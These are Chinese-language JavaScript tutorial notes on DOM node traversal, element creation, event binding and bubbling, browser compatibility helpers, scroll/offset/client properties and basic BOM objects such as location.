>[danger] ##### 打印后一个兄弟节点/元素  --- nextSibling/nextElementSibling
```
    <div id="dv">
        <span>这是div中的第一个span标签</span>
        <p>这是div中的第二个元素,第一个p标签</p>
        <ul id="uu">
            <li>你好</li>
            <li>我好</li>
            <li id="three">大家好</li>
            <li>都好</li>
            <li>我不好</li>
        </ul>
    </div>


<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var dvObj = my$("uu")
    var node = dvObj.nextSibling
    var el = dvObj.nextElementSibling
    console.log(node)
    console.log(el)

</script>

打印结果：
#text
null
```
[TOC]
>[danger] ##### 点击按钮给所有的P标签设置背景色
* 传统解决
```
<div id="dv">
    <span>这是span</span>
    <p>这是p</p>
    <span>这是span</span>
    <p>这是p</p>
    <span>这是span</span>
    <p>这是p</p>
    <span>这是span</span>
    <a href="http://www.baidu.com">百度</a>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$('btn').onclick = function () {
        var tags = document.getElementsByTagName('p')
        for(var i =0;i<tags.length;i++){
            tags[i].style.backgroundColor = 'red'
        }
    }
</script>
```
* 用node节点来解决
```
<input type="button" value="变色" id="btn"/>
<div id="dv">
    <span>这是span</span>
    <p>这是p</p>
    <span>这是span</span>
    <p>这是p</p>
    <span>这是span</span>
    <p>这是p</p>
    <span>这是span</span>
    <a href="http://www.baidu.com">百度</a>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$('btn').onclick = function () {
        var nodes = my$('dv').childNodes
        for(var i =0;i<nodes.length;i++){
            if (nodes[i].nodeType == 1 && nodes[i].nodeName == "P") {
                nodes[i].style.backgroundColor = "red";
            }
        }
    }
</script>
```
>[danger] ##### 隔行变色
```
1.使用节点的时候，最好自定义一个计数器，因为节点不一定包含元素
```
```
<input type="button" value="变色" id="btn"/>
<ul id="uu">
    <li>红烧肉</li>
    <li>糖醋排骨</li>
    <li>凉拌秋葵</li>
    <li>鱼香胡萝卜丝</li>
</ul>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$('btn').onclick = function () {
        var count = 0;
        var nodes = my$('uu').childNodes
        for(var i=0;i<nodes.length;i++){
            if(nodes[i].nodeName == "LI"){
                nodes[i].style.backgroundColor = count%2?'red':'yellow'
                count++
            }
        }
    }

</script>
```
>[danger] ##### 点击图片切换背景
![](https://box.kancloud.cn/5053389a6d5f45976aac71d5a54d6a1d_1435x368.png) 
```
1.要想切换背景 是给document.body.style.backgroundImage
2.要为每一个图片绑定事件
```
```
    <style>
        * {
            margin: 0px;
            padding: 0px;
        }

        body {
            background-image: url("images/1.jpg");
        }

        #mask {
            background-color: rgba(255, 255, 255, 0.3);
            height: 200px;
            text-align: center;
        }

        #mask img {
            width: 200px;
            margin-top: 35px;
            cursor: pointer;
        }

    </style>
</head>
<body>
<div id="mask">
    <img src="images/1.jpg" alt="">
    <img src="images/2.jpg" alt="">
    <img src="images/3.jpg" alt="">
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var imgObj = my$('mask').children
    for(var i=0;i<imgObj.length;i++){
        imgObj[i].onclick = function () {
            document.body.style.backgroundImage = "url("+this.src+")"
        }
    }

</script>
```

>[danger] ##### 复选框全选
```
1.当点击全选的时候，让所有的其他td checked 状态和当前点击的全选状态一致,也就
 是全选按钮触发为true 其他按钮都为true ，取消就都为flase
2.为其他标签注册点击事件，当点击的时候，循环所有的标签看当前状态是否全是选中
 ，做flag 标记 

```
```
<div class="wrap">
    <table>
        <thead>
        <tr>
            <th>
                <input type="checkbox" id="j_cbAll"/>
            </th>
            <th>菜名</th>
            <th>饭店</th>
        </tr>
        </thead>
        <tbody id="j_tb">
        <tr>
            <td>
                <input type="checkbox"/>
            </td>
            <td>红烧肉</td>
            <td>测试饭店</td>
        </tr>
        <tr>
            <td>
                <input type="checkbox"/>
            </td>
            <td>西红柿鸡蛋</td>
            <td>测试饭店</td>
        </tr>
        </tbody>
    </table>
</div>

<script>
    function my$(id) {
        return document.getElementById(id)
    }

    //获取全选的这个复选框
    var ckAll = my$("j_cbAll");
    //获取tbody中所有的小复选框
    var cks = my$("j_tb").getElementsByTagName("input");
    //点击全选的这个复选框,获取他当前的状态,然后设置tbody中所有复选框的状态
    ckAll.onclick = function () {
        //console.log(this.checked);
        for (var i = 0; i < cks.length; i++) {
            cks[i].checked = this.checked;
        }
    };

    for(var i=0;i<cks.length;i++){
        cks[i].onclick = function () {
            var flag=true;
            for(var j=0;j<cks.length;j++){
                if(!cks[j].checked){
                    //没选中就进来了
                    flag=false;
                    break;
                }
            }
            ckAll.checked = flag;
        }
    }
</script>
```

[TOC]
>[success] # 创建元素三种方式
```
1. document.write("标签的代码及内容");
2. 对象.innerHTML="标签及代码";
3. document.createElement("标签的名字");
```
>[info] ## document.write
```
1.创建元素,缺陷:如果是在页面加载完毕后,此时通过这种方式创建元素,那么页面上存在
的所有的内容清除
```
```
<input type="button" value="创建一个p" id="btn"/>
会被清除覆盖
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$("btn").onclick=function () {
        document.write("<p>这是一个p</p>");
    };
</script>
```
>[info] ## innerHTML
```
<input type="button" value="创建一个p" id="btn" />
<div id="dv"></div>
<script src="common.js"></script>
<script>
  //点击按钮,在div中创建一个p标签
  //第二种方式创建元素: 对象.innerHTML="标签代码及内容";

  my$("btn").onclick=function () {
    my$("dv").innerHTML="<p>窗前明月光,疑是地上霜,举头望明月,低头思故乡</p>";
  };
</script>
```
>[danger] ##### 点击添加图片 --- innerHTML案例
```
<input type="button" value="来个图片" id="btn"/>
<div id="dv"></div>

<script src="common.js"></script>
<script>
  //点击按钮,在div中创建一个图片
  my$("btn").onclick=function () {
     my$("dv").innerHTML="<img src='images/liuyan.jpg' alt='美女' />";
  };

</script>
```
>[danger] ##### 利用数组创建一组li标签
```
<input type="button" value="创建列表" id="btn"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var names = ["杨过", "郭靖", "张无忌", "张三丰", "乔峰", "段飞", "丁棚"];
    my$("btn").onclick=function () {
        var str = "<ul style='list-style-type: none;cursor: pointer'>";
        //根据循环创建对应对数的li
        for (var i = 0; i < names.length; i++) {
            str += "<li>" + names[i] + "</li>";
        }
        str += "</ul>";
        my$("dv").innerHTML = str;
        var list = my$("dv").getElementsByTagName('li')
        for(var i=0;i<list.length;i++){
            list[i].onmouseover = function () {
                this.style.backgroundColor = "yellow"
            }
            list[i].onmouseout = function () {
                this.style.backgroundColor=""
            }
        }
    };

</script>
```
>[info] ## 第三种createElement
```
1.第三种方式创建元素
2.创建元素
3.document.createElement("标签名字");对象
4.把元素追加到父级元素中
5.点击按钮,在div中创建一个p
6.appendChild 追加一个对象
```
```
    <style>
        div {
            width: 200px;
            height: 150px;
            border: 2px dashed pink;
        }
    </style>
</head>
<body>
<input type="button" value="创建p" id="btn"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$('btn').onclick = function () {
        var pObj = document.createElement("p")
        pObj.innerHTML =  "这是一个p"
        my$('dv').appendChild(pObj)
    }

</script>
```
>[danger] ##### 根据数组创建ul 标签
```
1.点击的时候会无限制创建
2.可以定义函数触发事件
```
```
<input type="button" value="创建p" id="btn"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var kungfu = ["玉女心经", "极乐神功", "辟邪剑谱"];
    my$('btn').onclick = function () {
        var ulObj = document.createElement("ul");
        my$('dv').appendChild(ulObj)
        for (var i=0;i<kungfu.length;i++){
            var liObj = document.createElement("li")
            liObj.innerText = kungfu[i]
            ulObj.appendChild(liObj)
            //为li添加鼠标进入事件
            liObj.onmouseover = mouseoverHandle;
            //为li添加鼠标离开事件
            liObj.onmouseout = mouseoutHandle;
        }
    }

    //此位置.按钮的点击事件的外面
    function mouseoverHandle() {
        this.style.backgroundColor = "red";
    }
    function mouseoutHandle() {
        this.style.backgroundColor = "";
    }

    //如果是循环的方式添加事件,推荐用命名函数
    //如果不是循环的方式添加事件,推荐使用匿名函数

</script>
```
>[danger] ##### 创建table
```
<input type="button" value="创建表格" id="btn"/>
<div id="dv"></div>
<script src="common.js"></script>
<script>

  var arr=[
    {name:"百度",href:"http://www.baidu.com"},
    {name:"谷歌",href:"http://www.google.com"},
    {name:"优酷",href:"http://www.youku.com"},
    {name:"土豆",href:"http://www.tudou.com"},
    {name:"快播",href:"http://www.kuaibo.com"},
    {name:"爱奇艺",href:"http://www.aiqiyi.com"}
  ];

  //点击按钮创建表格
  my$("btn").onclick=function () {
    //创建table加入到div中
    var tableObj=document.createElement("table");
    tableObj.border="1";
    tableObj.cellPadding="0";
    tableObj.cellSpacing="0";
    my$("dv").appendChild(tableObj);
    //创建行,把行加入到table中
    for(var i=0;i<arr.length;i++){
      var dt=arr[i];//每个对象
      var trObj=document.createElement("tr");
      tableObj.appendChild(trObj);
      //创建第一个列,然后加入到行中
      var td1=document.createElement("td");
      td1.innerText=dt.name;
      trObj.appendChild(td1);
      //创建第二个列
      var td2=document.createElement("td");
      td2.innerHTML="<a href="+dt.href+">"+dt.name+"</a>";
      trObj.appendChild(td2);
    }
  };

</script>
```
>[success] # 子元素添加方法
```
1.appendChild    --- 追加子元素
2.insertBefore   --- 向前插入子元素
3.removeChild    --- 移除子元素 父类点出来，找到子类参数删除
4.replaceChild   --- 替换子元素
```
>[danger] ##### 追加子元素 --- appendChild 
```
    <style>
        div {
            width: 200px;
            height: 150px;
            border: 2px dashed pink;
        }
    </style>
</head>
<body>
<input type="button" value="创建p" id="btn"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$("btn").onclick = function () {
        btnObj = document.createElement("button")
        my$("dv").appendChild(btnObj)
    }
</script>
```
>[danger] ##### 追加子元素两个参数 --- insertBefore 
```
1需要两个参数 第一个参数要添加的对象，第二个是 指定插入前面的第一个子元素
```
```
    <style>
        div {
            width: 200px;
            height: 150px;
            border: 2px dashed pink;
        }
    </style>
</head>
<body>
<input type="button" value="创建p" id="btn"/>
<div id="dv"></div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$("btn").onclick = function () {
        btnObj = document.createElement("button")
        my$("dv").insertBefore(btnObj,my$("dv").firstElementChild)
    }
</script>
```
>[danger] ##### 移除父级元素中第一个子级元素 -- removeChild
```
my$("btn2").onclick=function () {
    //移除父级元素中第一个子级元素
    my$("dv").removeChild(my$("dv").firstElementChild);
  };
```
>[danger] ##### 移除所有子集元素 -- removeChild
```
  my$("btn3").onclick=function () {
    //点击按钮删除div中所有的子级元素
    //判断父级元素中有没有第一个子元素
    while(my$("dv").firstElementChild){
      my$("dv").removeChild(my$("dv").firstElementChild);
    }
```

>[danger] #### 只创建一个元素
```
1.有则删除,无则创建
2.给创建的对象创建一个id 之类的判读条件，当没有这个判断时候创建，有则不执行
```
```
  my$("btn").onclick=function () {
    //判断,div中有没有这个按钮,有就删除
    //判断这个按钮的子元素是否存在
    if(!my$("btn2")){//如果为true就有
      var obj=document.createElement("input");
      obj.type="button";
      obj.value="按钮";
      obj.id="btn2";
      my$("dv").appendChild(obj);
    }

  };
```

[TOC]
>[success] # 按钮绑定多个事件 addEventListener/attachEvent
```
1 对象.addEventListener("事件类型",事件处理函数,false);--谷歌和火狐支持,IE8不支持
2 对象.attachEvent("有on的事件类型",事件处理函数)--谷歌不支持,火狐不支持,IE8支持
```
>[danger] ##### addEventListener
```
  为按钮绑定点击事件
  参数1:事件的类型 --- 事件的名字,没有on
  参数2:事件处理函数 --- 函数(命名函数,匿名函数)
  参数3:布尔类型,目前就写false ----- 没有为什么,不解释,明天说
```
```
 my$("btn").addEventListener("click",function () {
   console.log("1");
 },false);
 my$("btn").addEventListener("click",function () {
   console.log("2");
 },false);
 my$("btn").addEventListener("click",function () {
   console.log("3");
 },false);
 my$("btn").addEventListener("click",function () {
   console.log("4");
 },false);
```
>[danger] ##### attachEvent
```
  参数1:事件类型---事件名字，有on
  参数2:事件处理函数---函数(命名函数,匿名函数)
```
```
 my$("btn").attachEvent("onclick",function () {
   console.log("1");
 });

 my$("btn").attachEvent("onclick",function () {
   console.log("2");
 });

 my$("btn").attachEvent("onclick",function () {
   console.log("3");
 });

```

>[danger] ##### 异同点
```
相同点:
	1. 都可以为元素绑定事件
不同点：
	1.方法名不一样
	2.参数个数不一样addEventListener三个参数,attachEvent两个参数
	3.addEventListener 谷歌,火狐,IE11支持,IE8不支持
	4.attachEvent 谷歌火狐不支持,IE11不支持,IE8支持
	5.this不同,addEventListener 中的this是当前绑定事件的对象
  		attachEvent中的this是window
	6.addEventListener中事件的类型(事件的名字)没有on/attachEvent中的事件的类型(事件的名字)有on
```
```
 my$("btn").addEventListener("click",function () {
   console.log(this);
 },false);

 my$("btn").attachEvent("onclick",function () {
   console.log(this);
 });
```
>[success] # 取消绑定事件

>[danger] ##### 取消onclick 绑定事件
```
1.想取消onclick 的绑定事件，将对象重新赋值 为null，改变对象的指向
``` 
```
<input type="button" id="btn1">
<input type="button" id="btn2">
<script>
    function my$(id) {
        return document.getElementById(id);
    }

    my$('btn1').onclick = function () {
        console.log("点击显示")
    };
    my$("btn2").onclick = function () {
        my$("btn1").onclick = null;
    };
</script>
```
>[danger] ##### 取消 addEventListener 绑定事件removeEventListener
```
1.注意一定在绑定事件的时候不能使用匿名函数
2.取消绑定事件的时候使用removeEventListener，中的三个参数一次对应
 addEventListener
```
```
<input type="button" id="btn1">
<input type="button" id="btn2">
<script>
    function my$(id) {
        return document.getElementById(id);
    }

    function f() {
        console.log("绑定")
    }
    my$("btn1").addEventListener("click", f, false)
    my$("btn2").onclick = function () {
        my$("btn1").removeEventListener('click',f,false)
    }
</script>
``` 
>[danger] ##### 取消绑定attachEvent事件detachEvent
```
1.注意一定在绑定事件的时候不能使用匿名函数
2.取消绑定事件的时候使用detachEvent，中的两个参数一次对应
 attachEvent
```
```
  function f1() {
    console.log("第一个");
  }
  function f2() {
    console.log("第二个");
  }
  my$("btn").attachEvent("onclick",f1);
  my$("btn").attachEvent("onclick",f2);

  my$("btn2").onclick=function () {
      my$("btn").detachEvent("onclick",f1);
  };
```
>[success] # 事件冒泡
```
1.多个元素嵌套,有层次关系,这些元素都注册了相同的事件,如果里面的元素的事件触发
 了,外面的元素的该事件自动的触发了.
2.window.event.cancelBubble=true; IE特有的,谷歌支持,火狐不支持
3.e.stopPropagation(); 谷歌和火狐支持,
```
>[danger] ##### 案例
![](https://box.kancloud.cn/958b50e0e925b679320dbfa0d25f7bb1_324x220.png)
```
1.规律从内向外，点最内层会触发三次，中间两次，外层一次
```
```
    <style>
        #dv1 {
            width: 300px;
            height: 200px;
            background-color: red;
        }

        #dv2 {
            width: 250px;
            height: 150px;
            background-color: green;
        }

        #dv3 {
            width: 200px;
            height: 100px;
            background-color: blue;
        }
    </style>
</head>
<body>
<div id="dv1">
    <div id="dv2">
        <div id="dv3"></div>
    </div>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var objs = [my$("dv3"), my$("dv2"), my$("dv1")];
    objs.forEach(function (ele) {
        ele.addEventListener("click", function (e) {
			console.log("测试");
            e.stopPropagation();
            //window.event.cancelBubble = true

        }, true);
    })
</script>
```
>[danger] ##### 总结
```
1.事件的三个阶段：
	1.1 事件捕获阶段  :从外向内    ---false
	1.2 事件目标阶段  :最开始选择的那个
	1.3 事件冒泡阶段  : 从里向外   ---true
```
>[danger] ##### 为同一个元素绑定不同事件，对应一个函数
```
1.要注意的是 onclick 后面的函数/匿名函数有个参数，返回的是MouseEvent{...}对象
2.其中有一个属性type 可以获取当前点击事件
```
```
  //为同一个元素绑定多个不同的事件,指向相同的事件处理函数
  my$("btn").onclick = f1;
  my$("btn").onmouseover = f1;
  my$("btn").onmouseout = f1;
  function f1(e) {
    switch (e.type) {
      case "click":
        alert("好帅哦");
        break;
      case "mouseover":
        this.style.backgroundColor = "red";
        break;
      case "mouseout":
        this.style.backgroundColor = "green";
        break;
    }
  }
```
>[success] # onmousemove -- 图片跟着鼠标动
```
1.谷歌/火狐 直接使用onmousemove 函数带的参数e.clientX进行移动
2.ie8/谷歌也支持 使用 window.event.clientX
3.注意火狐谷歌带参数e 的直接使用pageX 或者pageY 等同于 可是距离+滚动出去的距离
```

>[danger] ##### 案例分析
![](https://box.kancloud.cn/7ac184e3977be19c41ad12e2ee6142f6_805x951.png)
```
1.clientX 是是区域的移动，图片相对的位置是距离，滚动出去的距离加上可视区域的距离
```

* 获取滚动出去距离的兼容代码
```
function getScroll() {
      return {
        left:window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft||0,
        top:window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop||0
      }
    }
```
>[danger] ##### 简单代码搭建
```
    <style>
    *{
    margin: 0;
    padding: 0;
    }
    body{
    height: 2000px;
    }
    img{
    position: absolute;
    }
    </style>
</head>
<body>
<img src="images/bird.png" alt="" id="im" />

<script>
    var imgObj = document.getElementById('im')
    document.onmousemove = function (e) {
        // 谷歌火狐支持
        imgObj.style.left = e.clientX + 'px';
        imgObj.style.top = e.clientY + 'px';

        // ie8中的鼠标移动事件方法中没有参数e,这种方法谷歌支持 火狐不支持
        imgObj.style.left = window.event.clientX + 'px'
        imgObj.style.top = window.event.clientY + 'px'
    }
</script>
```
>[success] # 百度搜索案例
```
1.每次触发事件都应该将显示的展示div 去掉，也就是每次触发事件都是一次新事件
2.获取文本框的value值，创建一个新的用来储存展示的数组，循环包含信息的数组，
 并且，用数组的indexof 属性返回当前位置，如果输入的内容在字符串当前位置0 则
 符合，就把符合的添加到新的数组中
 3.根据有则添加无则删除的理论，当搜索框没有内容或者数组没有内容的时候。就清空
  当前数据展示div，并且return 让他停止下面创建展示div 生成
 4.创建生成展示div 
```
>[danger] ##### 案例代码
```
    <style>
        #box{
            width: 450px;
            margin: 200px auto;
        }
        #txt{
            width: 350px;
            height: 20px;
        }
        #pop {
            width: 350px;
            border: 1px solid red;
        }
        #pop ul {
            margin: 10px;
            padding: 0px;
            width: 200px;
            list-style-type: none;

        }
    </style>
</head>
<body>
<div id="box">
    <input type="text" id="txt" value="">
    <input type="button" value="搜索" id="btn">
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    var keyWords = ["测试谁", "测试谁的", "测试我的", "测试我的测试",  "苹果好吃", "苹果此次召回没有中国"];
    my$('txt').onkeyup =function () {
        //每一次的键盘抬起都判断页面中有没有这个div
        if(my$("dv")){
            //删除一次
            my$("box").removeChild(my$("dv"));
        }
        var value = this.value
        var tempArr = []
        for (var i=0;i<keyWords.length;i++){
            if(keyWords[i].indexOf(value) == 0){
                tempArr.push(keyWords[i])
            }
        }
        //如果文本框是空的,临时数组是空的,不用创建div
        if (this.value.length == 0 || tempArr.length == 0) {
            //如果页面中有这个div,删除这个div
            if (my$("dv")) {
                my$("box").removeChild(my$("dv"));
            }
            return;
        }
        dvObj = document.createElement("div");
        my$('box').appendChild(dvObj)
        dvObj.id = "dv";
        dvObj.style.width = "350px";
        dvObj.style.border = "1px solid green";
        for(var i=0;i<tempArr.length;i++){
            var pObj = document.createElement("p")
            dvObj.appendChild(pObj)
            pObj.innerText = tempArr[i]
            pObj.style.margin = 0;
            pObj.style.padding = 0;
            pObj.style.cursor = "pointer";
            pObj.style.marginTop = "5px";
            pObj.style.marginLeft = "5px";
            //鼠标进入
            pObj.onmouseover = function () {
                this.style.backgroundColor = "yellow";
            };
            //鼠标离开
            pObj.onmouseout = function () {
                this.style.backgroundColor = "";
            };
        }

    }

```
[TOC]
>[success] # 兼容性
```
 如果这个属性在浏览器中不支持,那么这个属性的类型是undefined
```
```
1.文本中标签内容： 
  textContent属性,谷歌,火狐支持,IE8不支持
  innerText属性,谷歌,火狐,IE8都支持
```

>[danger] ##### 标签内容textContent/innerText
```
1.textContent属性,谷歌,火狐支持,IE8不支持textContent属性,谷歌,火狐支持,IE8不支
 持
2.设置标签中的文本内容,应该使用innerText属性,谷歌,火狐,IE8都支持
3.判断这个标签是否在当前浏览器兼容使用undefined
4.textContent 更加语义化，所以用textContent做优先判断
```
```
  function setInnerText(element,text) {
    //判断浏览器是否支持这个属性
    if(typeof element.textContent =="undefined"){//不支持
      element.innerText=text;
    }else{//支持这个属性
      element.textContent=text;
    }
  }

  //获取任意标签中间的文本内容
  function getInnerText(element) {
    if(typeof element.textContent=="undefined"){
     return element.innerText;
    }else{
      return element.textContent;
    }
  }
```
>[danger] ##### 兼容ie8/谷歌火狐 -- 获取第一个儿子元素 firstElementChild
```
1.第一个问题 在谷歌/火狐中 获取第一个元素的是firstElementChild。在ie是firstChild
2.ie中没有firstElementChild 所以下手点先判断 火狐/谷歌 在判断ie8
3.但为了兼容部分浏览器 也没有firstElementChild 且firstChild 就是获取第一个节点问
 题，做判断首先节点包含空白文本，就让他一直循环找他下一个兄弟标签直到找到，元
 素
```
```
<ul id="uu">
    <li>红烧肉</li>
    <li>糖醋排骨</li>
    <li>凉拌秋葵</li>
    <li>鱼香胡萝卜丝</li>
</ul>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    function getFirstElementChild(el) {
        if(el.firstElementChild){
            return el.firstElementChild;
        }else{
            var node = el.firstChild;
            while (node&&node.nodeType!=1){
                node=node.nextSibling;
            } 
            return node
            
        }
    }

</script>
```
>[danger] ##### 兼容ie8/谷歌火狐 -- 获取最后一个儿子元素 lastElementChild
```
  //获取任意一个父级元素的最后一个子级元素
  function getLastElementChild(element) {
    if(element.lastElementChild){//true--->支持
      return element.lastElementChild;
    }else{
      var node=element.lastChild;//第一个节点
      while (node&&node.nodeType!=1){
        node=node.previousSibling;
      }
      return node;
    }
  }
```
>[danger] #####  点击事件兼容
```
  //为任意元素.绑定任意的事件, 任意的元素,事件的类型,事件处理函数
  function addEventListener(element,type,fn) {
    //判断浏览器是否支持这个方法
    if(element.addEventListener){
      element.addEventListener(type,fn,false);
    }else if(element.attachEvent){
      element.attachEvent("on"+type,fn);
    }else{
      element["on"+type]=fn;
    }
  }
```
>[danger] ##### 解绑事件的兼容
```
  function removeEventListener(element,type,fnName) {
    if(element.removeEventListener){
      element.removeEventListener(type,fnName,false);
    }else if(element.detachEvent){
      element.detachEvent("on"+type,fnName);
    }else{
      element["on"+type]=null;
    }
  }
```
>[danger] ##### 滚动卷曲距离
```
    //获取页面向上或者向左卷曲出去的距离的值
    function getScroll() {
        return {
            left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
            top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
        };
    }
```
>[danger] ##### 获取位置兼容代码 
```
    // 获取位置兼容代码
    function getStyle(ele,attr){
        return window.getComputedStyle? window.getComputedStyle(ele,null)[attr]:ele.currentStyle[attr];
    }
```

>[danger] ##### 图片跟着鼠标移动的兼容代码
```
    //把代码放在一个对象中
    var evt={
        //window.event和事件参数对象e的兼容
        getEvent:function (evt) {
            return window.event||evt;
        },
        //可视区域的横坐标的兼容代码
        getClientX:function (evt) {
            return this.getEvent(evt).clientX;
        },
        //可视区域的纵坐标的兼容代码
        getClientY:function (evt) {
            return this.getEvent(evt).clientY;
        },
        //页面向左卷曲出去的横坐标
        getScrollLeft:function () {
            return window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft||0;
        },
        //页面向上卷曲出去的纵坐标
        getScrollTop:function () {
            return window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop||0;
        },
        //相对于页面的横坐标(pageX或者是clientX+scrollLeft)
        getPageX:function (evt) {
            return this.getEvent(evt).pageX? this.getEvent(evt).pageX:this.getClientX(evt)+this.getScrollLeft();
        },
        //相对于页面的纵坐标(pageY或者是clientY+scrollTop)
        getPageY:function (evt) {
            return this.getEvent(evt).pageY?this.getEvent(evt).pageY:this.getClientY(evt)+this.getScrollTop();
        }

    };
```
>[success] # offset 系列
```
1.如果直接在css设置长宽高，在style. 情况下是获取不到的，所以要使用下面的属性：
	* offsetWidth:获取元素的宽
    * offsetHeight:获取元素的高
    * offsetLeft:获取元素距离左边位置的值
    * offsetTop:获取元素距离上面位置的值
2.没有脱离文档流：
   offsetLeft:父级元素margin+父级元素padding+父级元素的border+自己的margin
3.脱离文档流：
	主要是自己的left和自己的margin
```
>[success] # scroll 事件
```
1.scrollWidth  -- 元素中内容的实际的宽(没有边框),如果没有内容就是元素的宽
2.scrollHeight -- 元素中内容的实际的高(没有边框),如果没有内容就是元素的高
3.scrollTop    -- 向上卷曲出去的距离
4.scrollLeft   -- 向左卷曲出去的距离
```
>[danger] ##### 案例解释 
```
1.在css 中 使用了 overflow: auto; 出现滚动效果
2.scrollTop 如果滑到最低部 计算公式是483 -200 = 283 其中483是内容高度-div高度
3.scrollLeft 同理
```
```
    <style>
        *{
            margin: 0;
            padding: 0;
        }
        div{
            width: 300px;
            height: 200px;
            border: 2px solid red;
            overflow: auto;
        }
        input{
            left: 330px;
            position: absolute;
            top:20px;

        }
    </style>
</head>
<body>
<div id="dv">
    测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试
    测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试
    测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试
    测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试
    测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试
    测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试
</div>
<input type="button" value="显示效果" id="btn"/>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    my$('btn').onclick = function() {
        console.log(my$('dv').scrollWidth)
        console.log(my$('dv').scrollHeight)
        console.log(my$('dv').scrollTop)
        console.log(my$('dv').scrollLeft)

    }
    //div的滚动事件
    my$("dv").onscroll=function () {
        console.log(this.scrollTop);
    };
</script>
```
>[danger] ##### 固定导航栏
```
1.向上卷曲出去的距离和最上面的div的高度对比
2.设置第二个div的类样式
3.设置第三个div的marginTop的值
```
```
    <style>
        * {
            margin: 0;
            padding: 0
        }

        img {
            vertical-align: top;
        }

        .main {
            margin: 0 auto;
            width: 1000px;
            margin-top: 10px;

        }

        .fixed {
            position: fixed;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>
<div class="top" id="topPart">
    <img src="images/top.png" alt=""/>
</div>
<div class="nav" id="navBar">
    <img src="images/nav.png" alt=""/>
</div>
<div class="main" id="mainPart">
    <img src="images/main.png" alt=""/>
</div>
<script>
    function my$(id) {
        return document.getElementById(id)
    }
    //获取页面向上或者向左卷曲出去的距离的值
    function getScroll() {
        return {
            left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
            top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
        };
    }
    //滚动事件
    window.onscroll=function () {
        //向上卷曲出去的距离和最上面的div的高度对比
        if(getScroll().top>=my$("topPart").offsetHeight){
            //设置第二个div的类样式
            my$("navBar").className="nav fixed";
            //设置第三个div的marginTop的值
            my$("mainPart").style.marginTop=my$("navBar").offsetHeight+"px";
        }else{
            my$("navBar").className="nav";
            my$("mainPart").style.marginTop="10px";
        }
    };
</script>
```
>[success] # cilent 可视区域
```
clientWidth:可视区域的宽(没有边框),边框内部的宽度
clientHeight:可视区域的高(没有边框),边框内部的高度
clientLeft:左边边框的宽度
clientTop :上面的边框的宽度
clientX:可视区域的横坐标,分别是鼠标相对于浏览器内容窗口左边和上边的偏移像素数值
clientY:可视区域的纵坐标,分别是鼠标相对于浏览器内容窗口左边和上边的偏移像素数值
```
>[danger] ##### 代码
```
    <style>
        div{
            width: 200px;
            height: 210px;
            border: 20px solid red;
            border-left-width: 50px;
        }
    </style>
</head>
<body>
<input type="button" value="移动到400px" id="btn1"/>
<input type="button" value="移动到800px" id="btn2"/>
<div id="dv"></div>
<script>
   function my$(id) {
       return document.getElementById(id)
   }
   console.log(my$("dv").clientWidth);
   console.log(my$("dv").clientHeight);
   console.log(my$("dv").clientLeft);
   console.log(my$("dv").clientTop);
</script>

打印结果：
200
210
50
20
```
[TOC]
>[success] # 认识BOM
```
1.BOM--->Browser Object Model 浏览器对象模型,操作浏览器的
2.浏览器中有个顶级对象:window
3.页面中顶级对象:document
4.页面中所有的内容都是属于浏览器的,页面中的内容也都是window的
```
>[danger] ##### 理解案例
```
1.其中top/window 返回的是对象
```
```
       var num=20;
       console.log(window.num);

       function f1() {
         console.log("测试");
       }
       window.f1();

    // 因为页面中的所有内容都是window的,window是可以省略的.

    window.document.write("哈哈");


       var name="您好";
       console.log(window.name);

       console.log(top);
       console.log(window);
```

>[danger] ##### 系统常用的 三种对话框
```
1.最后一个根据用户选择返回的是true 或者false
```
```
window.alert("您好啊");//以后不用,测试的时候使用
window.prompt("请输入帐号");
var result = window.confirm("您确定退出吗");
console.log(result);
```
[TOC]
>[success] # 常见操作

>[danger] ##### 页面加载的常见操作
```
1.onload                        --- 页面加载后
2.onunload                      --- 页面关闭后
3.onbeforeunload                --- 页面关闭之前
``` 

>[success] # 常见对象

>[danger] ##### 操作url的对象 --- location
```
1.location对象：
	location.hash            --- 地址栏上#及后面的内容
    location.host            --- 主机名及端口号
    location.hostname        --- 主机名
    location.pathname        --- 相对路径
    location.port            --- 端口号
    location.protocol        --- 协议
    location.search          --- 搜索的内容 get请求？包含？内容
    location.href="http://www.jd.com"       --- 连接跳转
	location.assign("http://www.jd.com");   --- 连接跳转的方法
	location.reload();                      --- 重新加载--刷新
